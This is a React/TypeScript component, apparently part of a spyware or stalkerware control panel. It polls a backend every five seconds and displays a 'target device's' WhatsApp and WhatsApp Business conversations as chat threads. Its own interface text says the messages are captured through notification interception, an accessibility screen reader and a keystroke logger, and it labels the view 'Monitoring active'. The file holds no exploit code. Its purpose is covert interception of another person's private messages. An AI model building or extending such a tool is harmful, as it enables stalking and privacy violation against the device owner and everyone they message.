import React, { useState, useEffect, useMemo } from 'react';
import { MessageSquare, Search, RefreshCw, CheckCheck, Smartphone, ShieldCheck } from 'lucide-react';
import { DeviceInfo } from '../types/dashboard.types';
import { apiService } from '../services/apiService';

interface WhatsAppPageProps {
  device: DeviceInfo;
}

interface WhatsAppMessage {
  id: string;
  sender: string;
  message: string;
  packageName: string;
  appName: string;
  isOutgoing: boolean;
  timestamp: string;
  rawTimestamp?: number;
  chatTitle?: string;
}

interface ChatThread {
  title: string;
  lastMessage: string;
  lastTimestamp: string;
  rawTimestamp: number;
  packageName: string;
  appName: string;
  messageCount: number;
}

const AVATAR_COLORS = [
  'bg-emerald-600',
  'bg-indigo-600',
  'bg-violet-600',
  'bg-blue-600',
  'bg-amber-600',
  'bg-teal-600',
  'bg-rose-600'
];

function getAvatarColor(name: string): string {
  let hash = 0;
  for (let i = 0; i < name.length; i++) {
    hash = name.charCodeAt(i) + ((hash << 5) - hash);
  }
  const index = Math.abs(hash) % AVATAR_COLORS.length;
  return AVATAR_COLORS[index];
}

function getInitials(name: string): string {
  if (!name) return 'WA';
  const parts = name.trim().split(' ');
  if (parts.length >= 2) {
    return (parts[0][0] + parts[1][0]).toUpperCase();
  }
  return name.slice(0, 2).toUpperCase();
}

export const WhatsAppPage: React.FC<WhatsAppPageProps> = ({ device }) => {
  const [messages, setMessages] = useState<WhatsAppMessage[]>([]);
  const [loading, setLoading] = useState<boolean>(true);
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [selectedChatTitle, setSelectedChatTitle] = useState<string>('');

  const fetchWhatsAppTelemetry = async () => {
    try {
      const data = await apiService.getWhatsApp(device.id, []);
      if (Array.isArray(data)) {
        setMessages(data);
      }
    } catch (err) {
      console.warn('Failed to fetch WhatsApp telemetry', err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    setLoading(true);
    fetchWhatsAppTelemetry();
    const interval = setInterval(fetchWhatsAppTelemetry, 5000);
    return () => clearInterval(interval);
  }, [device.id]);

  // Group messages into Chat Threads
  const threads = useMemo<ChatThread[]>(() => {
    const threadMap = new Map<string, WhatsAppMessage[]>();

    // Helper to normalize thread keys, mapping generic placeholders ("WhatsApp Contact", "Active Chat") to real contact if present
    const primaryContact = messages.find(
      (m) => m.sender && m.sender !== 'Me' && m.sender !== 'WhatsApp Contact' && m.sender !== 'Active Chat'
    )?.sender;

    const getThreadKey = (msg: WhatsAppMessage) => {
      const raw = msg.isOutgoing
        ? (msg.chatTitle && msg.chatTitle !== 'Active Chat' && msg.chatTitle !== 'WhatsApp Contact' ? msg.chatTitle : '')
        : (msg.sender && msg.sender !== 'Me' && msg.sender !== 'WhatsApp Contact' && msg.sender !== 'Active Chat' ? msg.sender : msg.chatTitle);

      if (!raw || raw === 'WhatsApp Contact' || raw === 'Active Chat') {
        return primaryContact || 'WhatsApp Contact';
      }
      return raw;
    };

    messages.forEach((msg) => {
      const threadKey = getThreadKey(msg);

      if (!threadMap.has(threadKey)) {
        threadMap.set(threadKey, []);
      }
      threadMap.get(threadKey)!.push(msg);
    });

    const list: ChatThread[] = [];
    threadMap.forEach((msgs, title) => {
      msgs.sort((a, b) => (a.rawTimestamp || 0) - (b.rawTimestamp || 0));
      const lastMsg = msgs[msgs.length - 1];

      list.push({
        title,
        lastMessage: lastMsg.message,
        lastTimestamp: lastMsg.timestamp,
        rawTimestamp: lastMsg.rawTimestamp || Date.now(),
        packageName: lastMsg.packageName,
        appName: lastMsg.appName,
        messageCount: msgs.length
      });
    });

    return list.sort((a, b) => b.rawTimestamp - a.rawTimestamp);
  }, [messages]);

  useEffect(() => {
    if (threads.length > 0 && (!selectedChatTitle || !threads.some(t => t.title === selectedChatTitle))) {
      setSelectedChatTitle(threads[0].title);
    }
  }, [threads, selectedChatTitle]);

  const filteredThreads = useMemo(() => {
    if (!searchQuery.trim()) return threads;
    const q = searchQuery.toLowerCase();
    return threads.filter(
      (t) => t.title.toLowerCase().includes(q) || t.lastMessage.toLowerCase().includes(q)
    );
  }, [threads, searchQuery]);

  const activeChatMessages = useMemo(() => {
    if (!selectedChatTitle) return [];

    const primaryContact = messages.find(
      (m) => m.sender && m.sender !== 'Me' && m.sender !== 'WhatsApp Contact' && m.sender !== 'Active Chat'
    )?.sender;

    const getThreadKey = (msg: WhatsAppMessage) => {
      const raw = msg.isOutgoing
        ? (msg.chatTitle && msg.chatTitle !== 'Active Chat' && msg.chatTitle !== 'WhatsApp Contact' ? msg.chatTitle : '')
        : (msg.sender && msg.sender !== 'Me' && msg.sender !== 'WhatsApp Contact' && msg.sender !== 'Active Chat' ? msg.sender : msg.chatTitle);

      if (!raw || raw === 'WhatsApp Contact' || raw === 'Active Chat') {
        return primaryContact || 'WhatsApp Contact';
      }
      return raw;
    };

    return messages
      .filter((msg) => getThreadKey(msg) === selectedChatTitle)
      .sort((a, b) => (a.rawTimestamp || 0) - (b.rawTimestamp || 0));
  }, [messages, selectedChatTitle]);

  const activeThreadInfo = useMemo(() => {
    return threads.find((t) => t.title === selectedChatTitle);
  }, [threads, selectedChatTitle]);

  return (
    <div className="space-y-6">
      {/* Top Header Bar */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div>
          <h1 className="text-xl font-bold text-slate-900 tracking-tight flex items-center gap-2">
            <MessageSquare className="w-6 h-6 text-emerald-600" />
            WhatsApp & WA Business Telemetry
          </h1>
          <p className="text-xs text-slate-500 mt-1">
            Real-time multi-layered tracking (Notifications + Accessibility Screen Reader + Keystroke Logger) for{' '}
            <span className="font-semibold text-slate-700">{device.alias}</span>
          </p>
        </div>

        <div className="flex items-center gap-3">
          <span className="inline-flex items-center gap-1.5 px-3 py-1 bg-emerald-50 text-emerald-700 border border-emerald-200 rounded-full text-xs font-semibold shadow-2xs">
            <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
            Multi-Layer Live Stream Active
          </span>

          <button
            onClick={fetchWhatsAppTelemetry}
            className="p-2 text-slate-500 hover:text-slate-700 hover:bg-slate-100 rounded-lg border border-slate-200 transition-colors"
            title="Refresh WhatsApp Telemetry"
          >
            <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
          </button>
        </div>
      </div>

      {/* Main WhatsApp Dashboard Container - Matches Clean Light Theme */}
      <div className="bg-white border border-slate-200 rounded-2xl shadow-sm overflow-hidden grid grid-cols-1 md:grid-cols-3 min-h-[580px]">
        {/* Left Panel: Chat List */}
        <div className="border-r border-slate-200 p-4 flex flex-col bg-slate-50/60">
          <div className="relative mb-4">
            <Search className="w-4 h-4 text-slate-400 absolute left-3 top-2.5" />
            <input
              type="text"
              placeholder="Search chats or text..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="w-full pl-9 pr-3 py-1.5 bg-white border border-slate-200 rounded-xl text-xs text-slate-800 placeholder-slate-400 focus:outline-none focus:border-emerald-500 shadow-2xs transition-all"
            />
          </div>

          <div className="flex-1 overflow-y-auto space-y-1.5 pr-1">
            {filteredThreads.length === 0 ? (
              <div className="text-center py-12 px-4 text-slate-400 text-xs">
                <MessageSquare className="w-8 h-8 mx-auto mb-2 text-slate-300" />
                No WhatsApp conversations found
              </div>
            ) : (
              filteredThreads.map((thread) => {
                const isSelected = thread.title === selectedChatTitle;
                const isBusiness = thread.packageName === 'com.whatsapp.w4b';

                return (
                  <div
                    key={thread.title}
                    onClick={() => setSelectedChatTitle(thread.title)}
                    className={`p-3 rounded-xl flex items-center justify-between cursor-pointer transition-all duration-150 ${
                      isSelected
                        ? 'bg-emerald-50/80 border border-emerald-200 shadow-2xs'
                        : 'hover:bg-slate-100/80 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center gap-3 min-w-0">
                      <div
                        className={`w-10 h-10 rounded-full ${getAvatarColor(
                          thread.title
                        )} text-white font-bold flex items-center justify-center text-xs shadow-xs flex-shrink-0`}
                      >
                        {getInitials(thread.title)}
                      </div>

                      <div className="min-w-0">
                        <div className="flex items-center gap-1.5">
                          <h4 className="font-semibold text-xs text-slate-900 truncate">
                            {thread.title}
                          </h4>
                          {isBusiness && (
                            <span className="px-1.5 py-0.5 bg-emerald-100 text-emerald-800 border border-emerald-200 text-[9px] font-bold rounded">
                              WA Biz
                            </span>
                          )}
                        </div>
                        <p className="text-[11px] text-slate-500 truncate mt-0.5">
                          {thread.lastMessage}
                        </p>
                      </div>
                    </div>

                    <div className="flex flex-col items-end flex-shrink-0 pl-2">
                      <span className="text-[10px] text-slate-400">{thread.lastTimestamp}</span>
                      <span className="mt-1 px-1.5 py-0.5 bg-slate-200/70 text-slate-600 text-[10px] font-semibold rounded-full">
                        {thread.messageCount}
                      </span>
                    </div>
                  </div>
                );
              })
            )}
          </div>
        </div>

        {/* Right Panel: Active Conversation View */}
        <div className="col-span-2 flex flex-col justify-between bg-slate-50/30 p-4 md:p-6">
          {activeThreadInfo ? (
            <>
              {/* Active Conversation Header */}
              <div className="border-b border-slate-200 pb-3 flex items-center justify-between bg-white px-4 py-3 rounded-xl border">
                <div className="flex items-center gap-3">
                  <div
                    className={`w-10 h-10 rounded-full ${getAvatarColor(
                      activeThreadInfo.title
                    )} text-white font-bold flex items-center justify-center text-sm shadow-xs`}
                  >
                    {getInitials(activeThreadInfo.title)}
                  </div>
                  <div>
                    <div className="flex items-center gap-2">
                      <h3 className="font-bold text-slate-900 text-sm">{activeThreadInfo.title}</h3>
                      {activeThreadInfo.packageName === 'com.whatsapp.w4b' ? (
                        <span className="px-2 py-0.5 bg-emerald-50 text-emerald-700 border border-emerald-200 text-[10px] font-semibold rounded-full">
                          WhatsApp Business
                        </span>
                      ) : (
                        <span className="px-2 py-0.5 bg-emerald-50 text-emerald-700 border border-emerald-200 text-[10px] font-semibold rounded-full">
                          WhatsApp
                        </span>
                      )}
                    </div>
                    <p className="text-[11px] text-slate-500 mt-0.5">
                      Target Device Interaction • {activeThreadInfo.messageCount} Total Logged Messages
                    </p>
                  </div>
                </div>

                <div className="flex items-center gap-2">
                  <span className="hidden sm:inline-flex items-center gap-1 px-2.5 py-1 bg-slate-100 border border-slate-200 text-slate-700 text-[11px] font-medium rounded-lg">
                    <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" />
                    Multi-Layer Verified
                  </span>
                </div>
              </div>

              {/* Chat Message Bubble Feed */}
              <div className="flex-1 py-6 space-y-4 overflow-y-auto max-h-[420px] px-2">
                {activeChatMessages.map((msg) => (
                  <div
                    key={msg.id}
                    className={`flex ${msg.isOutgoing ? 'justify-end' : 'justify-start'}`}
                  >
                    <div
                      className={`max-w-md p-3.5 rounded-2xl shadow-2xs ${
                        msg.isOutgoing
                          ? 'bg-emerald-600 text-white rounded-tr-xs'
                          : 'bg-white text-slate-800 border border-slate-200 rounded-tl-xs'
                      }`}
                    >
                      {!msg.isOutgoing && msg.sender && (
                        <div className="text-[11px] font-bold text-emerald-700 mb-1">
                          {msg.sender}
                        </div>
                      )}
                      <p className="text-xs leading-relaxed whitespace-pre-wrap">{msg.message}</p>

                      <div
                        className={`flex items-center justify-end gap-1.5 text-[10px] mt-1.5 ${
                          msg.isOutgoing ? 'text-emerald-100' : 'text-slate-400'
                        }`}
                      >
                        <span>{msg.timestamp}</span>
                        {msg.isOutgoing && <CheckCheck className="w-3.5 h-3.5 text-emerald-100" />}
                      </div>
                    </div>
                  </div>
                ))}
              </div>

              {/* Bottom Footer Info */}
              <div className="pt-3 border-t border-slate-200 flex items-center justify-between text-xs text-slate-500">
                <div className="flex items-center gap-2">
                  <Smartphone className="w-4 h-4 text-emerald-600" />
                  <span>Monitoring active for {device.alias}</span>
                </div>
                <span className="text-[11px] text-slate-400">Captured via Notification & Accessibility Engines</span>
              </div>
            </>
          ) : (
            <div className="flex-1 flex flex-col items-center justify-center text-slate-400 text-xs py-16">
              <MessageSquare className="w-12 h-12 text-slate-300 mb-3" />
              <p>Select a chat thread on the left to inspect message history</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
